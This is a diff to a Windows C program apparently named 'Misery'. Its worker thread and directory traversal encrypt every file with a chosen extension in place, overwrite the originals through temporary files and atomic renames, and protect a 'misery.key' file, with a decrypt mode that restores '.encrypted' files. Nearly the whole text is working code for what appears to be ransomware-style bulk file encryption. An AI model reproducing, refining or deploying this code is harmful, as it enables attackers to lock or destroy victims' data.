@@ -115,6 +115,20 @@ static DWORD WINAPI WorkerThread(LPVOID lpParam) {
         DWORD  fs = 0;
         bool   success = false;
 
+        /* ── Belt-and-suspenders: Skip misery.key even if it slipped through traverse ── */
+        if (!decryptMode) {
+            const char *fname = strrchr(narrowPath, '\\');
+            if (!fname) fname = narrowPath; else fname++;
+            if (_stricmp(fname, "misery.key") == 0) {
+                MiseryLog(MISERY_LOG_INFO, "FileOps: Worker skipping key file: %s", narrowPath);
+                success = true;
+                EnterCriticalSection(&ctx->statsLock);
+                ctx->stats.filesSucceeded++;
+                LeaveCriticalSection(&ctx->statsLock);
+                goto worker_done;
+            }
+        }
+
         hFile = CreateFileA(narrowPath, GENERIC_READ,
                             FILE_SHARE_READ | FILE_SHARE_WRITE,
                             NULL, OPEN_EXISTING,
@@ -143,9 +157,10 @@ static DWORD WINAPI WorkerThread(LPVOID lpParam) {
             goto worker_done;
         }
 
-        /* For decrypt: the file is the ciphertext buffer itself */
-        /* For encrypt: plaintext is read, ciphertext goes to buf */
         if (decryptMode) {
+            /* ══════════════════════════════════════════════════
+             * DECRYPT PATH
+             * ══════════════════════════════════════════════════ */
             bufSize = fs;
             buf = (BYTE *)VirtualAlloc(NULL, bufSize,
                                        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
@@ -158,18 +173,18 @@ static DWORD WINAPI WorkerThread(LPVOID lpParam) {
             if (!ReadFile(hFile, buf, fs, &rd, NULL) || rd != fs) {
                 MiseryLog(MISERY_LOG_WARN, "FileOps: ReadFile failed for %s (err: %lu)",
                           narrowPath, GetLastError());
-                goto worker_done;
+                goto worker_done;  /* buf will be freed in worker_done cleanup */
             }
             CloseHandle(hFile); hFile = INVALID_HANDLE_VALUE;
 
             /* Allocate output buffer for plaintext */
-            DWORD maxPlainCap = fs;  /* decrypted will be <= ciphertext size */
+            DWORD maxPlainCap = fs;
             plaintext = (BYTE *)VirtualAlloc(NULL, maxPlainCap,
                                              MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
             if (!plaintext) {
                 MiseryLog(MISERY_LOG_WARN, "FileOps: VirtualAlloc(%lu) plaintext failed (err: %lu)",
                           maxPlainCap, GetLastError());
-                goto worker_done;
+                goto worker_done;  /* buf + plaintext both cleaned up in worker_done */
             }
 
             DWORD decLen = 0;
@@ -182,7 +197,7 @@ static DWORD WINAPI WorkerThread(LPVOID lpParam) {
                 goto worker_done;
             }
 
-            /* Build decrypted file path: strip .encrypted */
+            /* Build decrypted file path: strip .encrypted suffix */
             char origPath[FILEOPS_MAX_PATH];
             strncpy(origPath, narrowPath, sizeof(origPath) - 1);
             origPath[sizeof(origPath) - 1] = '\0';
@@ -232,11 +247,7 @@ static DWORD WINAPI WorkerThread(LPVOID lpParam) {
             }
 
             /* Delete the .encrypted file */
-            if (!DeleteFileA(narrowPath)) {
-                MiseryLog(MISERY_LOG_WARN, "FileOps: DeleteFile %s failed (err: %lu)",
-                          narrowPath, GetLastError());
-                /* Non-fatal, continue */
-            }
+            DeleteFileA(narrowPath);  /* best-effort; non-fatal if fails */
 
             success = true;
             MiseryLog(MISERY_LOG_INFO, "FileOps: Decrypted %s (%lu bytes) → %s",
@@ -247,7 +258,9 @@ static DWORD WINAPI WorkerThread(LPVOID lpParam) {
             LeaveCriticalSection(&ctx->statsLock);
 
         } else {
-            /* ── ENCRYPT path ── */
+            /* ══════════════════════════════════════════════════
+             * ENCRYPT PATH
+             * ══════════════════════════════════════════════════ */
             bufSize = CRYPTO_REQUIRED_CAPACITY(fs);
             buf = (BYTE *)VirtualAlloc(NULL, bufSize,
                                        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
@@ -262,14 +275,14 @@ static DWORD WINAPI WorkerThread(LPVOID lpParam) {
             if (!plaintext) {
                 MiseryLog(MISERY_LOG_WARN, "FileOps: VirtualAlloc(%lu) plaintext failed (err: %lu)",
                           fs, GetLastError());
-                goto worker_done;
+                goto worker_done;  /* buf cleaned up in worker_done */
             }
 
             DWORD rd = 0;
             if (!ReadFile(hFile, plaintext, fs, &rd, NULL) || rd != fs) {
                 MiseryLog(MISERY_LOG_WARN, "FileOps: ReadFile failed for %s (err: %lu)",
                           narrowPath, GetLastError());
-                goto worker_done;
+                goto worker_done;  /* buf + plaintext cleaned up in worker_done */
             }
             CloseHandle(hFile); hFile = INVALID_HANDLE_VALUE;
 
@@ -278,6 +291,7 @@ static DWORD WINAPI WorkerThread(LPVOID lpParam) {
                                               plaintext, rd,
                                               buf, &encLen, bufSize);
 
+            /* Wipe plaintext from memory IMMEDIATELY */
             SecureZeroMemory(plaintext, fs);
             VirtualFree(plaintext, 0, MEM_RELEASE);
             plaintext = NULL;
@@ -285,10 +299,10 @@ static DWORD WINAPI WorkerThread(LPVOID lpParam) {
             if (cerr != CRYPTO_SUCCESS) {
                 MiseryLog(MISERY_LOG_WARN, "FileOps: EncryptBuffer failed for %s: %s (code=%d)",
                           narrowPath, GetErrorString(cerr), cerr);
-                goto worker_done;
+                goto worker_done;  /* buf cleaned up in worker_done; plaintext already NULL */
             }
 
-            /* Write to .tmp */
+            /* Write encrypted data to .tmp */
             char tmpPath[FILEOPS_MAX_PATH];
             snprintf(tmpPath, sizeof(tmpPath), "%s.tmp", narrowPath);
 
@@ -298,7 +312,7 @@ static DWORD WINAPI WorkerThread(LPVOID lpParam) {
             if (hWrite == INVALID_HANDLE_VALUE) {
                 MiseryLog(MISERY_LOG_WARN, "FileOps: Cannot create tmp %s (err: %lu)",
                           tmpPath, GetLastError());
-                goto worker_done;
+                goto worker_done;  /* buf cleaned up in worker_done */
             }
             DWORD wr = 0;
             BOOL writeOk = WriteFile(hWrite, buf, encLen, &wr, NULL);
@@ -310,7 +324,7 @@ static DWORD WINAPI WorkerThread(LPVOID lpParam) {
                 goto worker_done;
             }
 
-            /* Atomic rename: .tmp → original */
+            /* Atomic rename: .tmp → original (overwrite with encrypted data) */
             if (!MoveFileExA(tmpPath, narrowPath,
                              MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH)) {
                 MiseryLog(MISERY_LOG_WARN, "FileOps: MoveFileEx %s → %s failed (err: %lu)",
@@ -346,12 +360,16 @@ static DWORD WINAPI WorkerThread(LPVOID lpParam) {
             LeaveCriticalSection(&ctx->statsLock);
         }
 
+        /* ── Safe cleanup — all pointers check for NULL before freeing ── */
         if (buf) {
             SecureZeroMemory(buf, bufSize);
             VirtualFree(buf, 0, MEM_RELEASE);
             buf = NULL;
         }
         if (plaintext) {
+            /* plaintext was allocated with size fs in encrypt path,
+             * or with size maxPlainCap (= original fs) in decrypt path.
+             * Zeroing fs bytes covers whichever path was taken. */
             SecureZeroMemory(plaintext, fs > 0 ? fs : 4096);
             VirtualFree(plaintext, 0, MEM_RELEASE);
             plaintext = NULL;
@@ -419,19 +437,18 @@ static void TraverseInternal(FILEOPS_CTX *ctx, const WCHAR *dir, int depth) {
                 continue;
 
             if (ctx->config.decryptMode) {
-                /* Decrypt mode: only process .encrypted files */
-                /* Find LAST occurrence of .encrypted */
+                /* ══════════════════════════════════════════
+                 * DECRYPT TRAVERSE: only .encrypted files
+                 * ══════════════════════════════════════════ */
                 const char *encPos = NULL;
                 for (const char *p = narrow; *p; p++) {
-                    if (*p == '.' && _strnicmp(p, ENC_EXT, ENC_EXT_LEN) == 0) {
+                    if (*p == '.' && _strnicmp(p, ENC_EXT, ENC_EXT_LEN) == 0)
                         encPos = p;
-                    }
                 }
-                if (!encPos) continue; /* not an encrypted file */
-                /* Ensure .encrypted is at the end */
+                if (!encPos) continue;
                 if (encPos[ENC_EXT_LEN] != '\0') continue;
 
-                /* Derive original path to check if already decrypted */
+                /* Check if original already exists (already decrypted) */
                 char origPath[FILEOPS_MAX_PATH];
                 strncpy(origPath, narrow, sizeof(origPath) - 1);
                 origPath[sizeof(origPath) - 1] = '\0';
@@ -439,18 +456,29 @@ static void TraverseInternal(FILEOPS_CTX *ctx, const WCHAR *dir, int depth) {
                 *ep = '\0';
 
                 if (GetFileAttributesA(origPath) != INVALID_FILE_ATTRIBUTES) {
-                    /* Original already exists, skip */
                     MiseryLog(MISERY_LOG_INFO, "FileOps: Skipping (already decrypted): %s", narrow);
                     continue;
                 }
 
                 MiseryLog(MISERY_LOG_INFO, "FileOps: Queueing decrypt: %s", narrow);
                 EnqueueFile(ctx, full);
+
             } else {
-                /* Encrypt mode: only process target extensions */
+                /* ══════════════════════════════════════════
+                 * ENCRYPT TRAVERSE: target extensions only
+                 * ══════════════════════════════════════════ */
+
+                /* CRITICAL: Never encrypt misery.key */
+                const char *fname = strrchr(narrow, '\\');
+                if (!fname) fname = narrow; else fname++;
+                if (_stricmp(fname, "misery.key") == 0) {
+                    MiseryLog(MISERY_LOG_INFO, "FileOps: Skipping key file: %s", narrow);
+                    continue;
+                }
+
                 if (!IsTargetExtension(narrow)) continue;
 
-                /* Skip already-encrypted files */
+                /* Skip if .encrypted already exists (file already processed) */
                 char encPath[FILEOPS_MAX_PATH];
                 snprintf(encPath, sizeof(encPath), "%s%s", narrow, ENC_EXT);
                 if (GetFileAttributesA(encPath) != INVALID_FILE_ATTRIBUTES) continue;
